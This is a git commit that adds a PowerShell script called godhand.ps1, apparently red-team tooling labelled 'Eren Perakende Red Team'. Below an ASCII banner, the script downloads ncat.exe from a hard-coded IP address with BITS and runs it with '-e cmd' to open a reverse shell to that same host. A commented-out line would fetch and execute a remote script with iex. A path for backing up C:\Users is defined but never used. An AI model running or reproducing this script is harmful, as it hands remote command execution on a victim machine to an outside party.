d3217957dcf325b1ea7f7c69c25847fd922aa55a
Fatih Burak Toprak <fatihburaktoprak@gmail.com>
2025-03-07 15:12:26 +0300

    Create godhand.ps1

---
+++ godhand.ps1
@@ -0,0 +1,43 @@
+Clear-Host
+Write-Host ""
+Write-Host ""
+Write-Host -Fore Red 
+"
+╔═════════════════════════════════════════════════════════════════════════════════════════════════╗
+║                       █████ █████                               █████                      ████ ║
+║                      ░░███ ░░███                               ░░███                      ░░███ ║
+║  ███████  ██████   ███████  ░███████    ██████   ████████    ███████     ████████   █████  ░███ ║
+║ ███░░███ ███░░███ ███░░███  ░███░░███  ░░░░░███ ░░███░░███  ███░░███    ░░███░░███ ███░░   ░███ ║
+║░███ ░███░███ ░███░███ ░███  ░███ ░███   ███████  ░███ ░███ ░███ ░███     ░███ ░███░░█████  ░███ ║
+║░███ ░███░███ ░███░███ ░███  ░███ ░███  ███░░███  ░███ ░███ ░███ ░███     ░███ ░███ ░░░░███ ░███ ║
+║░░███████░░██████ ░░████████ ████ █████░░████████ ████ █████░░████████ ██ ░███████  ██████  █████║
+║ ░░░░░███ ░░░░░░   ░░░░░░░░ ░░░░ ░░░░░  ░░░░░░░░ ░░░░ ░░░░░  ░░░░░░░░ ░░  ░███░░░  ░░░░░░  ░░░░░ ║
+║ ███ ░███                                                                 ░███                   ║
+║░░██████                                                                  █████                  ║
+║ ░░░░░░                                                                  ░░░░░                   ║
+╚═════════════════════════════════════════════════════════════════════════════════════════════════╝
+" 
+
+Write-Host -Fore Red "          Eren Perakende Red Team"  
+Write-Host -Fore Gray "          https://github.com/dheenaxe/ErenRedTeam"
+Write-Host ""
+Write-Host ""
+
+# iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/peek.ps1')
+
+$outputArchive = "C:\eren\peek\UsersBackup.7z"
+$sourceFolder = "C:\Users"
+
+if (-not (Test-Path "C:\eren")) {
+    New-Item -Path "C:\eren" -ItemType Directory -Force
+}
+
+if (-not (Test-Path "C:\eren\godhand")) {
+    New-Item -Path "C:\eren\godhand" -ItemType Directory -Force
+}
+
+if (-not (Test-Path "C:\eren\godhand\ncat.exe")) {
+    Start-BitsTransfer -Source "http://78.129.240.79:8080/ncat.exe" -Destination "C:\eren\godhand\ncat.exe"
+}
+
+Start-Process -FilePath "C:\eren\godhand\ncat.exe" -ArgumentList "78.129.240.79", "9001", "-e", "cmd" -NoNewWindow -Wait
